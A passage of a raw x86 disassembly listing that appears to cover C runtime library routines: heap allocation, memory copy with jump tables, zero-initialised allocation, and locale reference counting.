  425f5d:	cmp    DWORD PTR ds:0x45e144,0x3
  425f64:	jne    0x425fa6
  425f66:	push   0x4
  425f68:	call   0x4254ff
  425f6d:	pop    ecx
  425f6e:	and    DWORD PTR [ebp-0x4],0x0
  425f72:	push   esi
  425f73:	call   0x426722
  425f78:	pop    ecx
  425f79:	mov    DWORD PTR [ebp-0x1c],eax
  425f7c:	test   eax,eax
  425f7e:	je     0x425f89
  425f80:	push   esi
  425f81:	push   eax
  425f82:	call   0x42674d
  425f87:	pop    ecx
  425f88:	pop    ecx
  425f89:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f8d:	call   0x425f9d
  425f92:	cmp    DWORD PTR [ebp-0x1c],0x0
  425f96:	jne    0x425fb5
  425f98:	push   DWORD PTR [ebp+0x8]
  425f9b:	jmp    0x425fa7
  425f9d:	push   0x4
  425f9f:	call   0x42546b
  425fa4:	pop    ecx
  425fa5:	ret    
  425fa6:	push   esi
  425fa7:	push   0x0
  425fa9:	push   DWORD PTR ds:0x45e140
  425faf:	call   DWORD PTR ds:0x42902c
  425fb5:	call   0x42537b
  425fba:	ret    
  425fbb:	push   0xc
  425fbd:	push   0x429680
  425fc2:	call   0x425340
  425fc7:	mov    esi,DWORD PTR [ebp+0x8]
  425fca:	cmp    DWORD PTR ds:0x45e144,0x3
  425fd1:	jne    0x426001
  425fd3:	cmp    esi,DWORD PTR ds:0x45df04
  425fd9:	ja     0x426001
  425fdb:	push   0x4
  425fdd:	call   0x4254ff
  425fe2:	pop    ecx
  425fe3:	and    DWORD PTR [ebp-0x4],0x0
  425fe7:	push   esi
  425fe8:	call   0x426f01
  425fed:	pop    ecx
  425fee:	mov    DWORD PTR [ebp-0x1c],eax
  425ff1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ff5:	call   0x42602d
  425ffa:	mov    eax,DWORD PTR [ebp-0x1c]
  425ffd:	test   eax,eax
  425fff:	jne    0x426024
  426001:	test   esi,esi
  426003:	jne    0x426006
  426005:	inc    esi
  426006:	cmp    DWORD PTR ds:0x45e144,0x1
  42600d:	je     0x426015
  42600f:	add    esi,0xf
  426012:	and    esi,0xfffffff0
  426015:	push   esi
  426016:	push   0x0
  426018:	push   DWORD PTR ds:0x45e140
  42601e:	call   DWORD PTR ds:0x429030
  426024:	call   0x42537b
  426029:	ret    
  42602a:	mov    esi,DWORD PTR [ebp+0x8]
  42602d:	push   0x4
  42602f:	call   0x42546b
  426034:	pop    ecx
  426035:	ret    
  426036:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42603b:	ja     0x42605f
  42603d:	push   DWORD PTR [esp+0x4]
  426041:	call   0x425fbb
  426046:	test   eax,eax
  426048:	pop    ecx
  426049:	jne    0x426061
  42604b:	cmp    DWORD PTR [esp+0x8],eax
  42604f:	je     0x426061
  426051:	push   DWORD PTR [esp+0x4]
  426055:	call   0x427c22
  42605a:	test   eax,eax
  42605c:	pop    ecx
  42605d:	jne    0x42603d
  42605f:	xor    eax,eax
  426061:	ret    
  426062:	push   DWORD PTR ds:0x45ddc8
  426068:	push   DWORD PTR [esp+0x8]
  42606c:	call   0x426036
  426071:	pop    ecx
  426072:	pop    ecx
  426073:	ret    
  426074:	int3   
  426075:	int3   
  426076:	int3   
  426077:	int3   
  426078:	int3   
  426079:	int3   
  42607a:	int3   
  42607b:	int3   
  42607c:	int3   
  42607d:	int3   
  42607e:	int3   
  42607f:	int3   
  426080:	push   ebp
  426081:	mov    ebp,esp
  426083:	push   edi
  426084:	push   esi
  426085:	mov    esi,DWORD PTR [ebp+0xc]
  426088:	mov    ecx,DWORD PTR [ebp+0x10]
  42608b:	mov    edi,DWORD PTR [ebp+0x8]
  42608e:	mov    eax,ecx
  426090:	mov    edx,ecx
  426092:	add    eax,esi
  426094:	cmp    edi,esi
  426096:	jbe    0x4260a0
  426098:	cmp    edi,eax
  42609a:	jb     0x42621c
  4260a0:	test   edi,0x3
  4260a6:	jne    0x4260bc
  4260a8:	shr    ecx,0x2
  4260ab:	and    edx,0x3
  4260ae:	cmp    ecx,0x8
  4260b1:	jb     0x4260dc
  4260b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260b5:	jmp    DWORD PTR [edx*4+0x4261cc]
  4260bc:	mov    eax,edi
  4260be:	mov    edx,0x3
  4260c3:	sub    ecx,0x4
  4260c6:	jb     0x4260d4
  4260c8:	and    eax,0x3
  4260cb:	add    ecx,eax
  4260cd:	jmp    DWORD PTR [eax*4+0x4260e0]
  4260d4:	jmp    DWORD PTR [ecx*4+0x4261dc]
  4260db:	nop
  4260dc:	jmp    DWORD PTR [ecx*4+0x426160]
  4260e3:	nop
  4260e4:	lock pusha 
  4260e6:	inc    edx
  4260e7:	add    BYTE PTR [ecx+eiz*2],bl
  4260ea:	inc    edx
  4260eb:	add    BYTE PTR [eax+0x61],al
  4260ee:	inc    edx
  4260ef:	add    BYTE PTR [ebx],ah
  4260f1:	ror    DWORD PTR [edx-0x75f877fa],1
  4260f7:	inc    esi
  4260f8:	add    DWORD PTR [eax+0x468a0147],ecx
  4260fe:	add    al,cl
  426100:	jmp    0x289e907
  426105:	add    esi,0x3
  426108:	add    edi,0x3
  42610b:	cmp    ecx,0x8
  42610e:	jb     0x4260dc
  426110:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426112:	jmp    DWORD PTR [edx*4+0x4261cc]
  426119:	lea    ecx,[ecx+0x0]
  42611c:	and    edx,ecx
  42611e:	mov    al,BYTE PTR [esi]
  426120:	mov    BYTE PTR [edi],al
  426122:	mov    al,BYTE PTR [esi+0x1]
  426125:	shr    ecx,0x2
  426128:	mov    BYTE PTR [edi+0x1],al
  42612b:	add    esi,0x2
  42612e:	add    edi,0x2
  426131:	cmp    ecx,0x8
  426134:	jb     0x4260dc
  426136:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426138:	jmp    DWORD PTR [edx*4+0x4261cc]
  42613f:	nop
  426140:	and    edx,ecx
  426142:	mov    al,BYTE PTR [esi]
  426144:	mov    BYTE PTR [edi],al
  426146:	add    esi,0x1
  426149:	shr    ecx,0x2
  42614c:	add    edi,0x1
  42614f:	cmp    ecx,0x8
  426152:	jb     0x4260dc
  426154:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426156:	jmp    DWORD PTR [edx*4+0x4261cc]
  42615d:	lea    ecx,[ecx+0x0]
  426160:	ret    
  426161:	popa   
  426162:	inc    edx
  426163:	add    BYTE PTR [eax-0x57ffbd9f],dh
  426169:	popa   
  42616a:	inc    edx
  42616b:	add    BYTE PTR [eax-0x67ffbd9f],ah
  426171:	popa   
  426172:	inc    edx
  426173:	add    BYTE PTR [eax-0x77ffbd9f],dl
  426179:	popa   
  42617a:	inc    edx
  42617b:	add    BYTE PTR [eax-0x74ffbd9f],al
  426181:	inc    esp
  426182:	mov    fs,esp
  426184:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  426188:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42618c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426190:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426194:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426198:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42619c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4261a0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4261a4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4261a8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4261ac:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4261b0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4261b4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4261b8:	lea    eax,[ecx*4+0x0]
  4261bf:	add    esi,eax
  4261c1:	add    edi,eax
  4261c3:	jmp    DWORD PTR [edx*4+0x4261cc]
  4261ca:	mov    edi,edi
  4261cc:	fsub   QWORD PTR [ecx+0x42]
  4261cf:	add    ah,ah
  4261d1:	popa   
  4261d2:	inc    edx
  4261d3:	add    al,dh
  4261d5:	popa   
  4261d6:	inc    edx
  4261d7:	add    BYTE PTR [edx+eiz*2],al
  4261da:	inc    edx
  4261db:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4261e1:	leave  
  4261e2:	ret    
  4261e3:	nop
  4261e4:	mov    al,BYTE PTR [esi]
  4261e6:	mov    BYTE PTR [edi],al
  4261e8:	mov    eax,DWORD PTR [ebp+0x8]
  4261eb:	pop    esi
  4261ec:	pop    edi
  4261ed:	leave  
  4261ee:	ret    
  4261ef:	nop
  4261f0:	mov    al,BYTE PTR [esi]
  4261f2:	mov    BYTE PTR [edi],al
  4261f4:	mov    al,BYTE PTR [esi+0x1]
  4261f7:	mov    BYTE PTR [edi+0x1],al
  4261fa:	mov    eax,DWORD PTR [ebp+0x8]
  4261fd:	pop    esi
  4261fe:	pop    edi
  4261ff:	leave  
  426200:	ret    
  426201:	lea    ecx,[ecx+0x0]
  426204:	mov    al,BYTE PTR [esi]
  426206:	mov    BYTE PTR [edi],al
  426208:	mov    al,BYTE PTR [esi+0x1]
  42620b:	mov    BYTE PTR [edi+0x1],al
  42620e:	mov    al,BYTE PTR [esi+0x2]
  426211:	mov    BYTE PTR [edi+0x2],al
  426214:	mov    eax,DWORD PTR [ebp+0x8]
  426217:	pop    esi
  426218:	pop    edi
  426219:	leave  
  42621a:	ret    
  42621b:	nop
  42621c:	lea    esi,[ecx+esi*1-0x4]
  426220:	lea    edi,[ecx+edi*1-0x4]
  426224:	test   edi,0x3
  42622a:	jne    0x426250
  42622c:	shr    ecx,0x2
  42622f:	and    edx,0x3
  426232:	cmp    ecx,0x8
  426235:	jb     0x426244
  426237:	std    
  426238:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42623a:	cld    
  42623b:	jmp    DWORD PTR [edx*4+0x426368]
  426242:	mov    edi,edi
  426244:	neg    ecx
  426246:	jmp    DWORD PTR [ecx*4+0x426318]
  42624d:	lea    ecx,[ecx+0x0]
  426250:	mov    eax,edi
  426252:	mov    edx,0x3
  426257:	cmp    ecx,0x4
  42625a:	jb     0x426268
  42625c:	and    eax,0x3
  42625f:	sub    ecx,eax
  426261:	jmp    DWORD PTR [eax*4+0x42626c]
  426268:	jmp    DWORD PTR [ecx*4+0x426368]
  42626f:	nop
  426270:	jl     0x4262d4
  426272:	inc    edx
  426273:	add    BYTE PTR [eax-0x37ffbd9e],ah
  426279:	bound  eax,QWORD PTR [edx+0x0]
  42627c:	mov    al,BYTE PTR [esi+0x3]
  42627f:	and    edx,ecx
  426281:	mov    BYTE PTR [edi+0x3],al
  426284:	sub    esi,0x1
  426287:	shr    ecx,0x2
  42628a:	sub    edi,0x1
  42628d:	cmp    ecx,0x8
  426290:	jb     0x426244
  426292:	std    
  426293:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426295:	cld    
  426296:	jmp    DWORD PTR [edx*4+0x426368]
  42629d:	lea    ecx,[ecx+0x0]
  4262a0:	mov    al,BYTE PTR [esi+0x3]
  4262a3:	and    edx,ecx
  4262a5:	mov    BYTE PTR [edi+0x3],al
  4262a8:	mov    al,BYTE PTR [esi+0x2]
  4262ab:	shr    ecx,0x2
  4262ae:	mov    BYTE PTR [edi+0x2],al
  4262b1:	sub    esi,0x2
  4262b4:	sub    edi,0x2
  4262b7:	cmp    ecx,0x8
  4262ba:	jb     0x426244
  4262bc:	std    
  4262bd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262bf:	cld    
  4262c0:	jmp    DWORD PTR [edx*4+0x426368]
  4262c7:	nop
  4262c8:	mov    al,BYTE PTR [esi+0x3]
  4262cb:	and    edx,ecx
  4262cd:	mov    BYTE PTR [edi+0x3],al
  4262d0:	mov    al,BYTE PTR [esi+0x2]
  4262d3:	mov    BYTE PTR [edi+0x2],al
  4262d6:	mov    al,BYTE PTR [esi+0x1]
  4262d9:	shr    ecx,0x2
  4262dc:	mov    BYTE PTR [edi+0x1],al
  4262df:	sub    esi,0x3
  4262e2:	sub    edi,0x3
  4262e5:	cmp    ecx,0x8
  4262e8:	jb     0x426244
  4262ee:	std    
  4262ef:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262f1:	cld    
  4262f2:	jmp    DWORD PTR [edx*4+0x426368]
  4262f9:	lea    ecx,[ecx+0x0]
  4262fc:	sbb    al,0x63
  4262fe:	inc    edx
  4262ff:	add    BYTE PTR [ebx+eiz*2],ah
  426302:	inc    edx
  426303:	add    BYTE PTR [ebx+eiz*2],ch
  426306:	inc    edx
  426307:	add    BYTE PTR [ebx+eiz*2],dh
  42630a:	inc    edx
  42630b:	add    BYTE PTR [ebx+eiz*2],bh
  42630e:	inc    edx
  42630f:	add    BYTE PTR [ebx+eiz*2+0x42],al
  426313:	add    BYTE PTR [ebx+eiz*2+0x42],cl
  426317:	add    BYTE PTR [edi+0x63],bl
  42631a:	inc    edx
  42631b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426321:	inc    esp
  426322:	(bad)  
  426323:	sbb    al,0x8b
  426325:	inc    esp
  426326:	mov    ds,WORD PTR [eax]
  426328:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42632c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426330:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426334:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426338:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42633c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426340:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426344:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426348:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42634c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426350:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426354:	lea    eax,[ecx*4+0x0]
  42635b:	add    esi,eax
  42635d:	add    edi,eax
  42635f:	jmp    DWORD PTR [edx*4+0x426368]
  426366:	mov    edi,edi
  426368:	js     0x4263cd
  42636a:	inc    edx
  42636b:	add    BYTE PTR [eax-0x6fffbd9d],al
  426371:	arpl   WORD PTR [edx+0x0],ax
  426374:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426375:	arpl   WORD PTR [edx+0x0],ax
  426378:	mov    eax,DWORD PTR [ebp+0x8]
  42637b:	pop    esi
  42637c:	pop    edi
  42637d:	leave  
  42637e:	ret    
  42637f:	nop
  426380:	mov    al,BYTE PTR [esi+0x3]
  426383:	mov    BYTE PTR [edi+0x3],al
  426386:	mov    eax,DWORD PTR [ebp+0x8]
  426389:	pop    esi
  42638a:	pop    edi
  42638b:	leave  
  42638c:	ret    
  42638d:	lea    ecx,[ecx+0x0]
  426390:	mov    al,BYTE PTR [esi+0x3]
  426393:	mov    BYTE PTR [edi+0x3],al
  426396:	mov    al,BYTE PTR [esi+0x2]
  426399:	mov    BYTE PTR [edi+0x2],al
  42639c:	mov    eax,DWORD PTR [ebp+0x8]
  42639f:	pop    esi
  4263a0:	pop    edi
  4263a1:	leave  
  4263a2:	ret    
  4263a3:	nop
  4263a4:	mov    al,BYTE PTR [esi+0x3]
  4263a7:	mov    BYTE PTR [edi+0x3],al
  4263aa:	mov    al,BYTE PTR [esi+0x2]
  4263ad:	mov    BYTE PTR [edi+0x2],al
  4263b0:	mov    al,BYTE PTR [esi+0x1]
  4263b3:	mov    BYTE PTR [edi+0x1],al
  4263b6:	mov    eax,DWORD PTR [ebp+0x8]
  4263b9:	pop    esi
  4263ba:	pop    edi
  4263bb:	leave  
  4263bc:	ret    
  4263bd:	push   DWORD PTR [esp+0x4]
  4263c1:	call   DWORD PTR ds:0x4290c8
  4263c7:	xor    eax,eax
  4263c9:	inc    eax
  4263ca:	ret    0x8
  4263cd:	push   0x10
  4263cf:	push   0x4296c8
  4263d4:	call   0x425340
  4263d9:	mov    eax,ds:0x45dd88
  4263de:	test   eax,eax
  4263e0:	jne    0x426419
  4263e2:	cmp    DWORD PTR ds:0x45dac4,0x1
  4263e9:	je     0x42640f
  4263eb:	push   0x4296b4
  4263f0:	call   DWORD PTR ds:0x429024
  4263f6:	test   eax,eax
  4263f8:	je     0x42640f
  4263fa:	push   0x42968c
  4263ff:	push   eax
  426400:	call   DWORD PTR ds:0x429020
  426406:	mov    ds:0x45dd88,eax
  42640b:	test   eax,eax
  42640d:	jne    0x426419
  42640f:	mov    eax,0x4263bd
  426414:	mov    ds:0x45dd88,eax
  426419:	and    DWORD PTR [ebp-0x4],0x0
  42641d:	push   DWORD PTR [ebp+0xc]
  426420:	push   DWORD PTR [ebp+0x8]
  426423:	call   eax
  426425:	mov    DWORD PTR [ebp-0x1c],eax
  426428:	jmp    0x42644e
  42642a:	mov    eax,DWORD PTR [ebp-0x14]
  42642d:	mov    eax,DWORD PTR [eax]
  42642f:	mov    eax,DWORD PTR [eax]
  426431:	mov    DWORD PTR [ebp-0x20],eax
  426434:	xor    eax,eax
  426436:	inc    eax
  426437:	ret    
  426438:	mov    esp,DWORD PTR [ebp-0x18]
  42643b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  426442:	jne    0x42644c
  426444:	push   0x8
  426446:	call   DWORD PTR ds:0x429094
  42644c:	xor    eax,eax
  42644e:	or     DWORD PTR [ebp-0x4],0xffffffff
  426452:	call   0x42537b
  426457:	ret    
  426458:	push   0x10
  42645a:	push   0x4296d8
  42645f:	call   0x425340
  426464:	mov    esi,DWORD PTR [ebp+0x8]
  426467:	imul   esi,DWORD PTR [ebp+0xc]
  42646b:	mov    DWORD PTR [ebp-0x1c],esi
  42646e:	test   esi,esi
  426470:	jne    0x426473
  426472:	inc    esi
  426473:	xor    edi,edi
  426475:	mov    DWORD PTR [ebp-0x20],edi
  426478:	cmp    esi,0xffffffe0
  42647b:	ja     0x4264e2
  42647d:	cmp    DWORD PTR ds:0x45e144,0x3
  426484:	jne    0x4264cd
  426486:	add    esi,0xf
  426489:	and    esi,0xfffffff0
  42648c:	mov    DWORD PTR [ebp+0xc],esi
  42648f:	mov    ebx,DWORD PTR [ebp-0x1c]
  426492:	cmp    ebx,DWORD PTR ds:0x45df04
  426498:	ja     0x4264cd
  42649a:	push   0x4
  42649c:	call   0x4254ff
  4264a1:	pop    ecx
  4264a2:	and    DWORD PTR [ebp-0x4],edi
  4264a5:	push   ebx
  4264a6:	call   0x426f01
  4264ab:	pop    ecx
  4264ac:	mov    DWORD PTR [ebp-0x20],eax
  4264af:	or     DWORD PTR [ebp-0x4],0xffffffff
  4264b3:	call   0x426502
  4264b8:	mov    edi,DWORD PTR [ebp-0x20]
  4264bb:	test   edi,edi
  4264bd:	je     0x4264d1
  4264bf:	push   DWORD PTR [ebp-0x1c]
  4264c2:	push   0x0
  4264c4:	push   edi
  4264c5:	call   0x427c40
  4264ca:	add    esp,0xc
  4264cd:	test   edi,edi
  4264cf:	jne    0x42650b
  4264d1:	push   esi
  4264d2:	push   0x8
  4264d4:	push   DWORD PTR ds:0x45e140
  4264da:	call   DWORD PTR ds:0x429030
  4264e0:	mov    edi,eax
  4264e2:	test   edi,edi
  4264e4:	jne    0x42650b
  4264e6:	cmp    DWORD PTR ds:0x45ddc8,edi
  4264ec:	je     0x42650b
  4264ee:	push   esi
  4264ef:	call   0x427c22
  4264f4:	pop    ecx
  4264f5:	test   eax,eax
  4264f7:	jne    0x426473
  4264fd:	jmp    0x42650d
  4264ff:	mov    esi,DWORD PTR [ebp+0xc]
  426502:	push   0x4
  426504:	call   0x42546b
  426509:	pop    ecx
  42650a:	ret    
  42650b:	mov    eax,edi
  42650d:	call   0x42537b
  426512:	ret    
  426513:	push   esi
  426514:	mov    esi,DWORD PTR [esp+0x8]
  426518:	mov    eax,DWORD PTR [esi+0x3c]
  42651b:	push   edi
  42651c:	xor    edi,edi
  42651e:	cmp    eax,DWORD PTR ds:0x45ddd4
  426524:	je     0x426589
  426526:	cmp    eax,edi
  426528:	je     0x426589
  42652a:	mov    eax,DWORD PTR [esi+0x2c]
  42652d:	cmp    DWORD PTR [eax],edi
  42652f:	jne    0x426589
  426531:	mov    eax,DWORD PTR [esi+0x34]
  426534:	cmp    eax,edi
  426536:	je     0x426554
  426538:	cmp    DWORD PTR [eax],edi
  42653a:	jne    0x426554
  42653c:	cmp    eax,DWORD PTR ds:0x45def0
  426542:	je     0x426554
  426544:	push   eax
  426545:	call   0x425f4a
  42654a:	push   DWORD PTR [esi+0x3c]
  42654d:	call   0x427e8f
  426552:	pop    ecx
  426553:	pop    ecx
  426554:	mov    eax,DWORD PTR [esi+0x30]
  426557:	cmp    eax,edi
  426559:	je     0x426577
  42655b:	cmp    DWORD PTR [eax],edi
  42655d:	jne    0x426577
  42655f:	cmp    eax,DWORD PTR ds:0x45def4
  426565:	je     0x426577
  426567:	push   eax
  426568:	call   0x425f4a
  42656d:	push   DWORD PTR [esi+0x3c]
  426570:	call   0x427e30
  426575:	pop    ecx
  426576:	pop    ecx
  426577:	push   DWORD PTR [esi+0x2c]
  42657a:	call   0x425f4a
  42657f:	push   DWORD PTR [esi+0x3c]
  426582:	call   0x425f4a
  426587:	pop    ecx
  426588:	pop    ecx
  426589:	mov    eax,DWORD PTR [esi+0x40]
  42658c:	cmp    eax,DWORD PTR ds:0x45deec
  426592:	je     0x4265ac
  426594:	cmp    eax,edi
  426596:	je     0x4265ac
  426598:	cmp    DWORD PTR [eax],edi
  42659a:	jne    0x4265ac
  42659c:	push   eax
  42659d:	call   0x425f4a
  4265a2:	push   DWORD PTR [esi+0x44]
  4265a5:	call   0x425f4a
  4265aa:	pop    ecx
  4265ab:	pop    ecx
  4265ac:	mov    eax,DWORD PTR [esi+0x50]
  4265af:	cmp    eax,DWORD PTR ds:0x45ddd0
  4265b5:	je     0x4265d3
  4265b7:	cmp    eax,edi
  4265b9:	je     0x4265d3
  4265bb:	cmp    DWORD PTR [eax+0xb4],edi
  4265c1:	jne    0x4265d3
  4265c3:	push   eax
  4265c4:	call   0x427ca0
  4265c9:	push   DWORD PTR [esi+0x50]
  4265cc:	call   0x425f4a
  4265d1:	pop    ecx
  4265d2:	pop    ecx
  4265d3:	push   esi
  4265d4:	call   0x425f4a
  4265d9:	pop    ecx
  4265da:	pop    edi
  4265db:	pop    esi
  4265dc:	ret    
  4265dd:	push   esi
  4265de:	call   0x4251f3
  4265e3:	mov    esi,eax
  4265e5:	mov    eax,DWORD PTR [esi+0x64]
  4265e8:	cmp    eax,DWORD PTR ds:0x45d58c
  4265ee:	je     0x42669a
  4265f4:	test   eax,eax
  4265f6:	je     0x426627
  4265f8:	mov    ecx,DWORD PTR [eax+0x2c]
  4265fb:	dec    DWORD PTR [eax]
  4265fd:	test   ecx,ecx
  4265ff:	je     0x426603
  426601:	dec    DWORD PTR [ecx]
  426603:	mov    ecx,DWORD PTR [eax+0x34]
  426606:	test   ecx,ecx
  426608:	je     0x42660c
  42660a:	dec    DWORD PTR [ecx]
  42660c:	mov    ecx,DWORD PTR [eax+0x30]
  42660f:	test   ecx,ecx
  426611:	je     0x426615
  426613:	dec    DWORD PTR [ecx]
  426615:	mov    ecx,DWORD PTR [eax+0x40]
  426618:	test   ecx,ecx
  42661a:	je     0x42661e
  42661c:	dec    DWORD PTR [ecx]
  42661e:	mov    ecx,DWORD PTR [eax+0x4c]
  426621:	dec    DWORD PTR [ecx+0xb4]
  426627:	mov    ecx,DWORD PTR ds:0x45d58c
  42662d:	mov    DWORD PTR [esi+0x64],ecx
  426630:	mov    ecx,DWORD PTR ds:0x45d58c
  426636:	inc    DWORD PTR [ecx]
  426638:	mov    ecx,DWORD PTR ds:0x45d58c
  42663e:	mov    ecx,DWORD PTR [ecx+0x2c]
  426641:	test   ecx,ecx
  426643:	je     0x426647
  426645:	inc    DWORD PTR [ecx]
  426647:	mov    ecx,DWORD PTR ds:0x45d58c
  42664d:	mov    ecx,DWORD PTR [ecx+0x34]
  426650:	test   ecx,ecx
  426652:	je     0x426656
  426654:	inc    DWORD PTR [ecx]
  426656:	mov    ecx,DWORD PTR ds:0x45d58c
  42665c:	mov    ecx,DWORD PTR [ecx+0x30]
  42665f:	test   ecx,ecx
  426661:	je     0x426665
  426663:	inc    DWORD PTR [ecx]
  426665:	mov    ecx,DWORD PTR ds:0x45d58c
  42666b:	mov    ecx,DWORD PTR [ecx+0x40]
  42666e:	test   ecx,ecx
  426670:	je     0x426674
  426672:	inc    DWORD PTR [ecx]
  426674:	mov    ecx,DWORD PTR ds:0x45d58c
  42667a:	mov    ecx,DWORD PTR [ecx+0x4c]
  42667d:	inc    DWORD PTR [ecx+0xb4]
  426683:	test   eax,eax
  426685:	je     0x42669a
  426687:	cmp    DWORD PTR [eax],0x0
  42668a:	jne    0x42669a
  42668c:	cmp    eax,0x45d538
  426691:	je     0x42669a
  426693:	push   eax
  426694:	call   0x426513
  426699:	pop    ecx
  42669a:	mov    eax,DWORD PTR [esi+0x64]
  42669d:	pop    esi
  42669e:	ret    
  42669f:	push   0xc
  4266a1:	push   0x429868
  4266a6:	call   0x425340
  4266ab:	push   0xc
  4266ad:	call   0x4254ff
  4266b2:	pop    ecx
  4266b3:	and    DWORD PTR [ebp-0x4],0x0
  4266b7:	call   0x4265dd
  4266bc:	mov    DWORD PTR [ebp-0x1c],eax
  4266bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4266c3:	call   0x4266d1
  4266c8:	mov    eax,DWORD PTR [ebp-0x1c]
  4266cb:	call   0x42537b
  4266d0:	ret    
  4266d1:	push   0xc
  4266d3:	call   0x42546b
  4266d8:	pop    ecx
  4266d9:	ret    
  4266da:	push   0x140
  4266df:	push   0x0
  4266e1:	push   DWORD PTR ds:0x45e140
  4266e7:	call   DWORD PTR ds:0x429030
  4266ed:	test   eax,eax
  4266ef:	mov    ds:0x45df00,eax
  4266f4:	jne    0x4266f7
  4266f6:	ret    
  4266f7:	mov    ecx,DWORD PTR [esp+0x4]
  4266fb:	and    DWORD PTR ds:0x45def8,0x0
  426702:	and    DWORD PTR ds:0x45defc,0x0
  426709:	mov    ds:0x45df08,eax
  42670e:	xor    eax,eax
  426710:	mov    DWORD PTR ds:0x45df04,ecx
  426716:	mov    DWORD PTR ds:0x45df0c,0x10
  426720:	inc    eax
  426721:	ret    
  426722:	mov    eax,ds:0x45defc
  426727:	lea    ecx,[eax+eax*4]
  42672a:	mov    eax,ds:0x45df00
  42672f:	lea    ecx,[eax+ecx*4]
  426732:	jmp    0x426746
  426734:	mov    edx,DWORD PTR [esp+0x4]
  426738:	sub    edx,DWORD PTR [eax+0xc]
  42673b:	cmp    edx,0x100000
  426741:	jb     0x42674c
  426743:	add    eax,0x14
  426746:	cmp    eax,ecx
  426748:	jb     0x426734
  42674a:	xor    eax,eax
  42674c:	ret    
  42674d:	push   ebp
  42674e:	mov    ebp,esp
  426750:	sub    esp,0x10
  426753:	mov    ecx,DWORD PTR [ebp+0x8]
  426756:	mov    eax,DWORD PTR [ecx+0x10]
  426759:	push   esi
  42675a:	mov    esi,DWORD PTR [ebp+0xc]
  42675d:	push   edi
  42675e:	mov    edi,esi
  426760:	sub    edi,DWORD PTR [ecx+0xc]
  426763:	add    esi,0xfffffffc
  426766:	shr    edi,0xf
  426769:	mov    ecx,edi
  42676b:	imul   ecx,ecx,0x204
  426771:	lea    ecx,[ecx+eax*1+0x144]
  426778:	mov    DWORD PTR [ebp-0x10],ecx
  42677b:	mov    ecx,DWORD PTR [esi]
  42677d:	dec    ecx
  42677e:	test   cl,0x1
  426781:	mov    DWORD PTR [ebp-0x4],ecx
  426784:	jne    0x426a61
  42678a:	push   ebx
  42678b:	lea    ebx,[ecx+esi*1]
  42678e:	mov    edx,DWORD PTR [ebx]
  426790:	mov    DWORD PTR [ebp-0xc],edx
  426793:	mov    edx,DWORD PTR [esi-0x4]
  426796:	mov    DWORD PTR [ebp-0x8],edx
  426799:	mov    edx,DWORD PTR [ebp-0xc]
  42679c:	test   dl,0x1
  42679f:	mov    DWORD PTR [ebp+0xc],ebx
  4267a2:	jne    0x426818
  4267a4:	sar    edx,0x4
  4267a7:	dec    edx
  4267a8:	cmp    edx,0x3f
  4267ab:	jbe    0x4267b0
  4267ad:	push   0x3f
  4267af:	pop    edx
  4267b0:	mov    ecx,DWORD PTR [ebx+0x4]
  4267b3:	cmp    ecx,DWORD PTR [ebx+0x8]
  4267b6:	jne    0x4267fa
  4267b8:	cmp    edx,0x20
  4267bb:	mov    ebx,0x80000000
  4267c0:	jae    0x4267db
  4267c2:	mov    ecx,edx
  4267c4:	shr    ebx,cl
  4267c6:	lea    ecx,[edx+eax*1+0x4]
  4267ca:	not    ebx
  4267cc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  4267d0:	dec    BYTE PTR [ecx]
  4267d2:	jne    0x4267f7
  4267d4:	mov    ecx,DWORD PTR [ebp+0x8]
  4267d7:	and    DWORD PTR [ecx],ebx
  4267d9:	jmp    0x4267f7
  4267db:	lea    ecx,[edx-0x20]
  4267de:	shr    ebx,cl
  4267e0:	lea    ecx,[edx+eax*1+0x4]
  4267e4:	not    ebx
  4267e6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  4267ed:	dec    BYTE PTR [ecx]
  4267ef:	jne    0x4267f7
  4267f1:	mov    ecx,DWORD PTR [ebp+0x8]
  4267f4:	and    DWORD PTR [ecx+0x4],ebx
  4267f7:	mov    ebx,DWORD PTR [ebp+0xc]
  4267fa:	mov    edx,DWORD PTR [ebx+0x8]
  4267fd:	mov    ebx,DWORD PTR [ebx+0x4]
  426800:	mov    ecx,DWORD PTR [ebp-0x4]
  426803:	add    ecx,DWORD PTR [ebp-0xc]
